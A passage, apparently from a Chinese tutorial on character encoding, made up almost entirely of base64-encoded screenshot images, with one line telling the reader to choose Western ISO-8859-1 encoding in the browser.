ef/fu0/lnLPuPNS7+YX3Q4UPIiWLtz9evl2yePvCwu2PFm9fmL19bu72hcXbl9ZuX9n4/9u70+A2zgPN4+/nman5MFO1tbO166pMTXkms0mt6QSYUmLZknP5viVKdkJjnTAeOzqog6KOdTJOaEE7UXRMHDtRpIm8M7Zpw7IkyxJFiaJESRZFigQlnuB9Srxw9AEQIEG590Mf6AtAg8TVjedXb9lAo7vREmni77cbIPebRq5umuMShsipUtVXeNk+D0IEIQJgGtYPEUg7hEha8CHivMr9qZPrmuVuMtwf27nftXCH2rnfe7gPRrmBMDcS5vY3cVzcENknnJ4Ry0IMEHWIxGWJJEGIAJgaf2pGGAgRSCqPKoTLQIh0P+DvzmqIPLpvy792N9RHuasL3OUI98dO7j88XEuQ641w41FuNJo4RE7FbvNhETtZE39GxHIQIgCmJg8RzIikk+5Jk1wdjGWlO0QC3Q8Eshsi3/5VyeOHyn786f+rvHHjBhuqn+XaF7ieL7mWBa55nrs1zx3t5DjDMyLC7Mey0lKECEIEwCTIPFPHX6+KEEkj1fUZ2oWqGyZl8A+SwT+v+UPkbxxFX9nyrW/u/eE//umXzx/a/auWS0c7B973TH7Uz1T1hE8Mh4/c5DgDF6uK+EVJT81YqkwQIgCmRqIIkQzQvYBUdTul60PzkMH5nsz+eTMTIoHuB/zdWQqRv3pm2V8//a3/8srK/7buB/eUP3bP/3n8b3/1xN/96xP/67cv3f/OT+479Mo3jmzlkp6aiS30eITHpBBRREn8LU0MIQJganyIXECIcNkqA+PTA4s7nqVsZXxb3dUSL8zI3635Q+S+Te+tqvzwn9/57PU/ntvwp/NbP27YefLGz8+2/rK6eXdty4YzX6z+5HMuUYiI8x2KtJDFh7ZDECIIEYB8QqJMndAiTKGHCJf5cyWpvipnJ0Tk66c3RDJ+EipjIRLofiDsy0aI/NkrVX/5evVfban/7zuv//2vWr75f1tte9u/fbDrO7/veerIwP/+cPiHf+rkjMyISCdgSk/J6sOzb5n2nTEIEYQIQB4hUbZOahGESL6dK8nO8SwlXJa4q6VKe4h4Hgh4shsiPzn+F6+e+st11X+98fx/3XLhnm1191Rc+ttd9ff+/Mr//JeGb+6+vuLXjVy8ENFe+xGzbJ9nYeFUqd4bdBEiCBGAPEKibB3fIggRDiGy5PURIsal75NVtXTOx1gYQgTA1GIhErVoiCS4+kG7XH5ZpfZizJSuokj1CDm9syq6x5N4/XgLdR/V/n+0kT9vukIkDX+TGQoRTzZCpKamZq9hOr9rBkQIEQBTE0OEvWDJENF9XU9wW7dLEu8nXcep+1wJjifescVbEu/PbmQPxv/4af+bScLMIQLpghABMDUSZS5EWWFYMkR0/48/3utlvFfcLIRISs+baihken0jD2VE5kLEgxAxDYQIgKkRqUKsGiJLWY4QMbi+kYcyIt0hQiFETAghAmBqRDovgxDRLkeIGFwhwcLMQogAQgTA5AprRsTINSK662czRIxczJFgHSNLECIIEStBiACYGokyF/gxz9RaL0S4ZO/+UF04YuRuJl5udXee4HjiHQxRSmk/CXYV75gT3DX4p051E+0ukq6SaojwAyFiIggRAFMj83QtP+boWo6Q7VvXWCxETCHVl+RMxNAiEL0ZmkVsvpQjSLoKQsTyECIApkbmqPPSQIjkRKoTLZmbmMmm9Bx/2kOk5wGpRSJZCZFr1669F4fOh5iBHoQIgKmRCHVOGggRMJl0hwid9RCJ9/mq77333s2bN/fu3ctxXKaPwewQIgCmRiKBc9LgCNm+BSEC5mGVENl4rKb0w89feu/4C0c+efIPH33/dx/wy/kWyfQxmF0kEhkdHb1z547X6/XLBAIB/p/yNKFpWh4iEQDINXmI1CBEwGQyECL8yIcZEf6GsRbx7FtG4vzmmVOlql87o1lgdpFIZHR0dGJiwu/387Mg2hmRQIDSDZFBwwZEIyMjV65cef/9999+++233377dzLaJQCQFAlT58KBmnDgbDhwliOkYkuxKkTivaFjCa8eAGmS/hBZTvcsz5MQSfFiEf3ftCt1R+xhKUTibWE2fIhMTk6q5j+MzIiMpu727dvvv//++Ph4MBhkAWDJSIQ6F6bihkiCt2iiRSD3MhciPVkNkUtXhqQhP3ifz9fX16cbIvuWkSSWlZbK1lm2zyNMm5wqjd22hKWEyIRhd0TT09PvvPNOKBRi2SDLsgwTGzTN0DQjX4KBgZF0kAhVE6FqwlRNmEotRLR3AbItUyGynO55IOLP2YzIkfovf/3Zly43d/U2x3FcghkRz75l6pxQnXnx7FtWGKdmJicnVRerGgmRKaXp6Wn+ht/vp2na7/dPafh8vnfffTcYDLEsS9M0BZA6hmGDwVAwGNK9keujyzYSCdREAjXhQE04UK0bIolnQdAikEtWCRHVjMhrH3Nrj3Cbq7lfNnBcwhDRlogqM06VErJs2TJSeupUqc6kiSWKJO0hwlfIqlWraJqOFyIsG6Qo2u8PeL0+DIxUB8Ow3/7Wt35aWqq68cs332QYNueHl+UhhEgk/jUiyh/7+fHB3gC8DIbI8hzOiHzn1Rd/9Pu3d9V2HXJPcolDRDXjoZ7/OFVaWlpKSktL9aLDKlMjqhBhGCYUCoVCoaASwzBGQoSvkK985SsVFRUJQ4T1Byiv1zc9PYOBkeqgaebHr7zy3tGjqhsnjh+naSbnh5flQcL+s2H/2bC/Ouyv5gip2Bw3RBIEB1oEciO9IRLJWYioZkT+4dGf/I/vvXzfj3asfusIlyRE5PGhvvr0VCkpPSXmRsHMiIRCoaKionvvvffee+/96le/unz58ldfffU3v/lNMBhMGiJ8hdxzzz2PPvrokSNHEoQIw7A+n396emZycgoDI9VBUdT2ioqTJ0+qbtTV1VEUlfPDy/IgUoUkDhFUCOSjdIcI05sXMyIqyd81I0SGqis8+0r3eRLMe1h6RmT16tUOh2Pnzp0ffPDBpUuXDM6IMAzz9a9/3Waz7dix49NPP00QIlNT08PDI729/V1dHgyMVMf4+G2+P1Q36urqxsdv5/zwsjzIrK961neGHxwh2zavTilEUCGQS1YJEfmMyNlaz2dn2j453swPLoUQ0X0fTMGFiNQi27Zt+/jjj1taWvgKMXKNCD8j8tJLL+3du7e6ujpBiExOTg0MDHV397S1dWJgpDpGRsb4/lDdqKurGxkZy/nhZXmQkPe0NBKESJxXAVQI5FQGQkRqEVPMiAgFIgYIf1eZF3xueHTf7mulEOEzQroOn2XZYDB47NgxqUIMXqzKt8ju3bsvXryYIEQmJiZ7e/vb27vc7lsYGKmOwcHhgwcOXLhwQXWjoaFhcHA454eX5UGCM59LgyOkfNMqbYio3jsjLTT+egGQEZkJEb5F8nxGhA8L3Y8CEaJD/fllGtaaEfF6vYFAgBZRFM2ybCgUYtnYmyG1v2tGGyLSvMiZM2cShMidOxPd3b2trW1NTS0YGKmO/v7BE8ePNzU1qW7cunWrv38w54eX5UHY6VPi+Mx4iKBCIC9YJUQSw6+bSYwPEb4eGIZhGIamGVoP/2haPkdkdGzc7b71xReNV682YGCkOlpb2zyePo+nT/dGzg8vy4Mw06eY6c+Y6ZPM9Ml4IQKQp9IaIncjHlYMEaY3SyFSU1OzN5mamppMH4ap8SFCUZRYIbHskOJDzkiIJMCHSH//4KVLV+vq6msvXMLAwFjKIFKFMFMnOELKy15AiIBpmD9EYOn4EKFpWvrVFQzDMgzDssI/VeQh4jVsRhQIBFwuV1PTjZs321tabjY3uzEwMJYyCD11UhwnOEK2IkTARNIeIn3LWYSI2fAhYvw3bMlDxK/EfxhrYhRFtba2fvrpp/8OAOlA6KkT0kCIgMlkIkTEFkGImEUkEhkbG5tOxYIYIiltBQCZQKipE+I4jhABk0l3iAT5EOlbzvYJIZKt3/oEAFCg+FMzmBEBc0KIAACYHGGmT0gDF6uCyWQgRKQWmUOIAABkHmGnTwqDf9cM3r4LJpL2EOlfHuxHiAAAZA8JzXwWmvksNHMyNHOSI2TbZoQImAdCBADA5Mis7/NZ3yl+pPq7ZgByLDMhEuxfHkSIAABkBYn4T4eF8TlHSMWWYoQImEb6Q+RBhAgAQDaRCFUdoaoj1JkIdYYjZPvWNQgRMI3MhUg/QgQAIBvIHH12jq7mB0IETCbdIRLqf1BqkbkAQgQAIOPIPHNWGhwhO8rXIkTANNIcIj2hgQelFkGIAABkAYmyNeJAiIDZpDtEZgceQojkg2NXu3/429rlu45hYGBYfkghchYhAuaT9hAZfCg08GBo4MFg/4MIkRw63TpxbdCfhe8gAMg5IlUIQgTMJ70hMtcTHnxIaBGESE6dbp3IwrcPAOQDIlVIFNeIgOmkNUS+nOsJD60IDz40O/BQaODBuYALIZIr8hD5xh/MNAAgVUSqEIQImE+6QyQyvCI8+BA/LzKPEMkdhAhA4SBShSBEwHzSHyIrw0MrwkMrECK5hRABKBzyEKlGiIDJpDtE5kZWzg2vjAytCA+tmKcQIjmjCBEXN8JxR13GUqCW4/zci2lti3rjz44QAUgdkSoEIQLmk+4QmR9ZOTeykp8XiVotRNxOO3G44jzoctidbvndOKu6HESxYoYgRAAKB5EqBCEC5pP+EHmYD5HI0Ioo9Ym1QoRKkBFShwg39EPE5SA65HsUY8fttKseiT25kZZZ/KkZhAiA2RCpQhAiYD6ZCRH+BE2UNnuI8DWQEF8Ebqdd2SHaEOH3pY6T2Iaqu26nnTgcyuKIBYhqMx0IEYDCgRABM0t7iIw+PD/6MJ8j5g8RgdtpVweE8kRM7JyN3pSH3el2O+3iZIZsO83Mhqxe+F1K22nWj3vqR6A9NfMLqQncwvIRt6IVYmQhIi3nV37RzXHirn4xyHGDioY46ufqa2Ob1NfKQkR8UmmTeCsDQKoQImBmGQuR+ZGHLRMi2hJRdojLIcx1yCYqEl0jQhwu8V/qp5F2qzhFI6woDxFpXWWrSBKEiJACsgtH6mUd8IvBWIjIZzL4buBXGHHrT5wc9XOc+ETfqI3d1n3SeCsDQKoQImBmGQqR0YfnRy0UIqpTIdp7Dofd4VL0SvwZC/1zNOptYpMssRRRzKCIK6ceIvK2OOrSJIV0t1b9nSDNoPDTGNqzLVKsqO7qPGn8lQEgVQgRMLNMhsiCdUJEeRWI8oXf5XS6tSdv9EJE/1JVonvhh/wdOmKKKJ45yWUi6QmROBeLIEQA8oo8RM4gRMBk0h0iUauGCCV1hN7LPx8i8UPD6SCEELtdrx1ip3n0Z0TEe6prV5NcJJJCiChPzRz1K07NyE/ZSJeGjLi5F93iaqqzLeIlIPKrSeKFiO7KAJAqKUTOIETAfDIQIlGLh4je67+xGRH9SQxFiGiuEZFtq6gg6fGln5pRnoU56pZNhLi4EXG5dIGI9KhQEsoQqR+M7eoXeu+aUcyI6K0MAKlCiICZpT1Exh6OjgktYpkQEQpE7AL+ruLF33CIJDo1o/OuGc3W2lWNhEha34ubYKjOtixuZQBIFZEqBCEC5oMQSUQoB91TIIopivTMiBj5fBCj6yFEAAoHkSqEDxEMDJONZBYTImMPR60QIjmQ8GPkBZn9ZFWECIDZKEJkITKEGRGwmJSvEUGI5AH89l2AwoEQAYtDiJiRPEQAwNoQImBxi3jXDJ8jCwxCJGcQIgCFAyECFrfIEBlFiOQSQgSgcCBEwOIWHyI4NZM7p1snrg36c/29AwDZoAqRQYQIWAxCxIx6x33VPRgYGAUx5CFyGiEC1oMQAQDIZwgRsDiECABAPpNC5DRCBCwJIWJSBw4cqKioKAMAqyNShSBEwJIQImbk3LPn4MGDk5OTCwBgdUSqEIQIWBJCxIzKy8unp6fn5+cZALA6hAhYHELEjMrKyhYWFnL94xEAsgEhAhaXYoisRIjkg7Kysmg0SgNAAUCIgMUhRMyID5FcHwUAZANCBCwu9RDhB0IklxAiAIUDIQIWt9gQWWmuEHE77Xany2knananW7Uecbji7cXlkDZwOaQtXQ5pLy6Hzv5dDuJwUZTbaY+/5xTxIRLQ4d5tI46P9R5RrmTb7U62Srz9fOxQbaxZAABphBABiyuMEHE77Xanm/+nZrFeP8TrFbfTToRN+EV8m7jcsd0K3SH9m9ILET54dJ7X4ZJ1TVxlZWXz8/M+fR+9TGxvNcd50Ofz+XzNb9mSrJFoPx+9bHurWf6wsECxRfNbNvLyR+JN4dYiJP/DAFgdQgQsriBCRAiOuCEiMtIA0qrx1jQQIjrPK58s0RynBh8iXq/X6/VW2pJVlK2yKtlKBlYhxFZSIlvHVtnUVGkjJVXeqpLYbV5Tpc1W2eT1eqtKCLHZSkpKbIRf4I2tEVtdQ/6otC+AAoUQAYsrhBARX9jdSU7NuBzE4dRZhzhcBmZN9E/9EOJwqENE1R1GFqjIQ4TXVGlTv65Xlei/gDfxyaGfAcn3ow0DzRNVlcj23lRp03ky4yGi2h1AwUGIgMWlGCIrTBgi0pUd0kyD+DqvmHrQm4dwOYQM0exN6BJtLmieRDMjon0iTXdIq0ingpT4EJmRa6y0lVTJF1SV2CobZzQaK20llZU2W2VliXJ9g/vh5zhspKSqqkRn0qSycWamsdImbVJVQkqqhH8q9iFtUMWHivRASUmJcneK/QEUHoQIWFzqIbLCXCHidtrtdtUrv86Eg9tpV2WFsgGk2RRhHSEr5PMk4gkZ6XJWzf4UYZLweGSpFCdEZmdnBxTq3rj//jfq9O9Jjqwla4+IDx5Zq7dK4v0cWbt27Vqydu1aQrQbCzvknySxujfuj610ZC3hj0fcp+JRYzsEsCyECFic5UPE5XS64r1lRjyn4hYyQ//EjLCOare614jIiyJ2W6wVaZJDvak2RJJcJsKHSJ9K7a6iol21fX19fYfXEOGWnLRUWlF/vfj7ObyGrDl8eI20sUbRrlrZ5gnU7ioiaw7LdyxsrfeooT0CWBVCBCxuUSGyIjq6wiwhQqlf1d1Oh91O7HZn7KXf5Yi9y1a+ley+3vUlSVol3ht2U5kRiYMPkV6tw8VCD5xXPXB+V1Fs6fldRdLtw8WEFB82tp/zu4p3ne89XKzdvbhV0a7zvb2Hi3X2qHM8spX455MfoOrRpDsEsCyECFhcoYVIrDnUcxqJQ0TJ5SB2u+4njiS6pjV2zsbANSIGTs3o/MQSAkL9ui28kouPKqYwzuu1SJz9CI8lD5E4a8RySJEa/AayVlKGiCpLAAoMQgQsrpBCRHp5j10+KgsAYyHCh0YsKYjeBasJ95DSu2bih0goFPLIHOLLofiQ/G7RzhqPnpqdRfEeMrCfQ8VFO2s8NTuLdFqLX/NQsbQDzROLOxO2L9q5s5golhUfkj+acHcABQEhAhZXMCHiklWH7IVfcSWH7jUd0j7inICJre5wJDt9E/8yEc3xJvsckVAo1NXV1dXVtaOIEEJW/6FL6yz/WNGOs5rlessM7ucPqzUbC6RH9J5gsdK5LwAzQoiAxRVCiOShBB8lb/CTVYPBYEceO1NxH1n17tL38+4qcl/FmaXvB8C8ECJgcQgRM8r/EAGAdEGIgMUhRMyID5E2ACgACBGwOISIGZWVlbEsewsACgBCBCwOIWJG5eXlo6OjXq+3FQCsDiECFocQMaM9e/bs379/fHycBQCrQ4iAxSFETGr37t3l5eVlAGB1CBGwOIQIAEA+Q4iAxSFEAADyGUIELA4hAgCQzxAikMcIWfo+ECIAAPkMIQIWhxABAMhnCBGwOIQIAEA+Q4iAxSFEAADyGUIELA4hAmAcRwgGRtYG/12HEAGLQ4gAGCe9NgBkGkIECgVCBMA4hAhkDUIECkWKIfIQQgQKGUIEsgYhAoUCIQJgHEIEsgYhAoUCIQJgHEIEsgYhAoUi9RDhB0IEChFCBLIGIQKFAiECYBxCBLIGIQKFYrEh8hBCBAoQQgSyBiEChQIhAmAcQgSyBiEChWIJIeJCiEChQYhA1iBEoFAgRACMQ4hA1iBEoFAgRACMQ4hA1iBEoFAgRACMQ4hA1iBEoFAgRACMy88QOXDgQEVFRRmYSkVFxYEDBxJ8WREiUCgQIgDG5WGIOPfsOXjw4OTk5AKYyuQolMlqAAANiklEQVTk5MGDB5179sT7yiJEoFAgRACMy8MQKS8vn56enp+fZ8BU5ufnp6eny8vL431lESJQKFIMkRUIEShkeRgiZWVlCwsLuX5VhcVYWFgoKyuL95WVh8jnCBGwsNRDZAVCBApWfoZINBqlwYSi0ShCBAAhApCCvA2RXB8FLEZKIcIPhAhY0KJCZAVCBAoTQgTSaBEh8jlCBKwnxRBZKbXI4kKEpmmWZYPBYCgUCgaDDMPQNL3o/4wBskwWIi4Hcbhij7gcxO50x+67nXYS43A4iIJi3SXhQyQAJoQQAeC4xYTIysWFCMMwLBucmGK7+6j6696T56cuN3m7+6nJ6SDDBJEjYAqxEHE57E43RblUgSF0h1gobqddXiuUtLFsqdtpJw6XOl2Iw6WtGz1lZWXz8/M+hea3bIS8/JF6CbG91Sxb9tHLsgUfvSw+Mb8dvwFR7QbSan5+HiECkGqIPCwLkRR++y7Lsl4fe/LcRH3jTFcf4wuEFxbu+uk5Tz9zuclXfWnK60eLgAmIrw1up4MPBNW8iGqRtBpFuZ12qSnkHRJbLgaJgnwzfXyIeOWaKm02m42UVCkWkZKSEmKrbJKWVUl3q0qItHZTpU24WaVcHdIOIQLAcamFSG907DtSixgPEZZlJ6fo6ksTXX3+u3fvfqnRM0jXXJ6cmmbRIpDnhNcGviRcDu0pF8WMiDBrQlGUYm5EvlhRLTohops6CtoQaaq02SqbqkrkJdJUaSMlVU2VNllbSKHBb6B5mUSIZBpCBIDjFh8iKw2GCMMwMz7mzMXbQ6PU3S/vSmNBHPzdsYlg7ReTXh+TdIcAOcS/NgjnY+xOd6JMiJ1q4VcU60N+ukY+4REnRKRV3E673okaPkRmYhorbbbKxpmZqhJiq2yMLSQlVfy/SUnVzMyMfAV+RmRGRbEDWBS9TCXSowgRAI5LOUS+K7WIwRBh2eCx6qGO3pnZuXAoEg5FZkPh2VA4FJSNUHg2FJnt7POeuzxO08oWkZ2CF06jJ5iolv/ITjSfHecnvviMik0T/v9onCsAwLJip2aEr7zLQex2u/qVRkgUIlxGIt7VXq4q//ZSXd4qfWOJ68QPkdnZ2QHJkbXk/jfqlLcGBureuJ+sPSLe4m/KHz+ylhAiLNfuCZZA9XWXPzQ7O4sQAUg1RL4ntYiREKFp+s4kVXt1zE8FvJR/JuCd9nunfDOT3plJ79Skd2rSOzPlm57yeaf93hm/70rT7YlJ5S6EH8L8z32dq/k0l/jp0fnpHfcqQKlDYhcjIkRAxL82SN9zdofDbnc47A4Xf7bG5bA73XwGuxwOh0MWIkrCd46imOP1cZKs5kOkT3R4DSnaVau5XburiKw53CfdJmsOK1aNPUCk9TSPwyJJP4pUyxEiAByXcoh8X2oRIyHCsmyHZ+qL5qHxidtjk3dGJsaGb48Ojg33jw49/c9d/SOD/aNDA6PDQ2Mjw+OjI7fHW9rGOnumFbvgO8DlsDvd8iTQ7widGRG306l9P0L8WIltKL56aN+kmRC6xNrUnyPichCHU/vdJX7vSCHidCgfdgrfVuoZEf232CT8tuJDpFdwuFh9LMWHe3t7e8/vKhJuifdIcXExKdp1vlflcLG4zWHdx2FRCCHahQgRAI5LLUT6omM/EFvEUIgEg8FzVwZaOoYGR4f6RwZ7hgf48fAPz/GDv9vd5/EM9PYM9rd2DXzRPKb3g97hdNp1ZsC109syfFTI3regN4Gh/L/V2EuBXnCIbeN2U3o7lC0Hq5K/fVf8rnA59WZEKEWIqL81XLEQMXCNiIFTM8IrW6wiVPeVISKkCBFC4/yuothjsfxAiGQaQgSA41IKkfm+6NgjYot8d4E5ljREQqHQhyfb+4aHbna39wz1dw14ugY89z32b/LRNeDp6O3u6O3yDPbeaL9ZfbFP+wM7zhkQ8Qe+uE7caQr5j3rljpSvES4H0VyKoq0c/pnsTndsfy4HIcTucKFErC52sWrsYz7c8UNE/Q0oUhSv/F0zOt+10hrxQyQUCnk8Ho/Hc6iYkOJDHhlxSc3OItUjNTuLCCnaWRO7I06hHFIsUW4F6RQKhRAiACmGyPijYot8z0iIsCx79qLnxs2uumv1vUP93f2ee/7pNe1o7+1q6+1o7+262NB48Vq/YhfCT2Hx3Ey8GRFCCCEOF/+uSnESxOUQ/29V/gIg+1Guvcef7pf3Cq4RARnFqRkhY1XfLoQQKTI0MyLaNkl+YXXyzxEJhUJdYEIIEQCOSzlEHouO8S3y/QXm06QhwjDMzc7RC190XLx+pbG1+VZXh+5o6bjV3HHzclPD1ebu1s5RxS7kIZLwZ7TbaXe4ZKlid7pdDiEs9DdSX2ficor/c6tzALF7SaTvo7shD2Xid80keBOXwU9WDQaDHWBCwWAQIQKQaog8LrbID4yECE3T43e8x8+6G1oaP6+rqb16qe7alYvXrlxsuHLx+tWL169ebLhSd+1K7dX6L5qbjp8/U3ete/zOjPonsTjdoVcB/ES4tIr0iZVup4N/RO/HuOxTINTEWXZjkeFy2B0OJ6ZECkh+/tI7hIhJIUQAOG5xITL+aHTskQXmuLFPVqU/PNlYf72ttaujwX3jbH1tzeUL1fXnz1w6d/pizZmL52ouX6i5Unf+av31m55PTjert5afII99rBNRTHm7nXbhOhLFjIhL6BD55ariPmXz5wrJZkSUDyR/fy9YTN6GSBuYEEIEgONSDpEnpBYxGCI0TU9MeT8+1djS3jN6e7x7sK+9p6uptflaS2ODu/G6+0ZDS+MtT0drZ/+pWvfklFe9fezdBXxTKDtB/MQG8c29smtE3E673enkH4l9tLYiQPi76l+ZaiBEpIta49wHy8rPEGFZ9haYEMuyCBGAxYXI49HxxwzPiFAURQ2P3vnk9PWm1h6v3+tl/FO0dyowMxWYmWZ8k76p1vb+kzU3hkfv6PyuGWUH6H72pHBNqubTK6VfaMpPjsRrBWGfssmVBAfAP4HuflSVA5aUhyFSXl4+Ojrq9XpbwVS8Xu/o6Gh5eXm8ryxCBApFiiHypNQiC8wJ4yFCUdTtian//PTyqfM3Glq6B8fH/SFqeGKi6WbPmbqW/zhWf2diaqk/jwEyLw9DZM+ePfv37x8fH2fBVMbHx/fv379nz554X1mECBSK1ENEaJFUQ4SiKJ/fPzA01tDceeJsw3uuuuNnGxqauwaGx/3+wJJ+EgNkSx6GCEVRu3fvLi8vLwNTKS8v3717d4IvK0IECkUqIdIvhsiT0fEnFhEivIDSYn7uAuRIfoYIWBJCBApFiiHylCxETi4iRLRXgehcFwKQrxAikDUIESgUiw2RJxcXIgCmhhCBrEGIQKEwHCJ/8eV83/z4k+LgZ0T+Ibf/oQJkGUIEsgYhAoUihRCZ65sfe0Icjy8wJ3ZsQIhAYUGIQNYgRKBQpBQic6OPSyNKn9iOEIECgxCBrEGIQKGQh4jP55NCxO12X716VR0iI49JI0qf2L7+73P7HypAliFEIGuShMiUl8r1ywdAemhDZGhoSBUib775ZtHX/vzLud7IyCPSiNLHt6+/N7f/oQJkGUcIBkbWBv9dpxMiXd09Y1MBDAxrjJEJ39Dtmf7RSc/geHvPoLujp6H51qUvmqpr649/fvbof3706/2/3bJthxAiwz+QRpQ+vn0dQgQAILMUIXI34jn+yb/tKF9rtrFm+9Y127cUV2wp3rZ5VXnZC1s3Pr95w3Ob1z+7ad0zZeue2fizp1WjbN3TZeueKVv3zKZ1z2xa/+ym9c9u3vCcztj43JaNz4vjuS3S8vXPblKM5zZLY4N0W9jtlo3Pb934QvmmVfzYtnnVts2ryjet2lr2wpaNz0nHyR8qPzaue2ajcHjPblqvPKT1z0pDePZ1z4p/lmc3b3hu88bnt5S9UL5p1bbNqyu2rNm+dU0a/5KFv+FNwt/wpnXPlEl/q68/JQ7ZX/Xr/HhqA7+cf0g8VP5vRhzP838bin3+7GnF3sQn2vDaU+tfe1IcT61/7amNP3u6bN2zmzc8v7VsVfmm1ds2F2/fsmZ7+dod5Wu3b11TsWVN+abVWzau2rT++Q2vP/v6T5/66Y8ff6XkkR+9+L1Vzz/02CP/tPzbXy/62p/fnesND39XGlH6WMW6v8v1f6EAABannBEJNdyNeBYig2YbA9FwfzTcH53tmwv1RoI9YaY7RHeFqM5goJMNdDL+Dvlg/Z1sQBjBQGeQ6gxSXSFaO7r1hvgo1RmkuoJUp/4ICE8dpDpDdFeI6Z5lPWHWE2Y9EdYTCXrCrIffCetvZ/ztjK+N9rXR3lu09xYlDtp7i/a10b52xi+NNmnQPnHw68/cpLy3aH8bE+jgn3SW8YSDnkioZy7UOxfqnTc25nRGDz8iQU+Y6Z6lO0NURzDQzvjbaO8taqY1IA7/TGtgppWauckfjPSnEG7wR+tvZ/yyI5T9tfBftSDVyQY6xD+v6gvXwfjbaV877WujvW2Ut43y8aOd9newVFeI9oSDvZFQ31yoLxruj0YGFyKD87P9kWBvkOqmvB0zE623R5oGe690ttXeuP7Z5Ysff3b88B9/v+dffl5W9LU/uzvXEx76jjSiFEIEACDj/j/RkUB/7lcqxwAAAABJRU5ErkJggg==)

然后在浏览器端选择西方ISO-8859-1

![](data:image/png;base64,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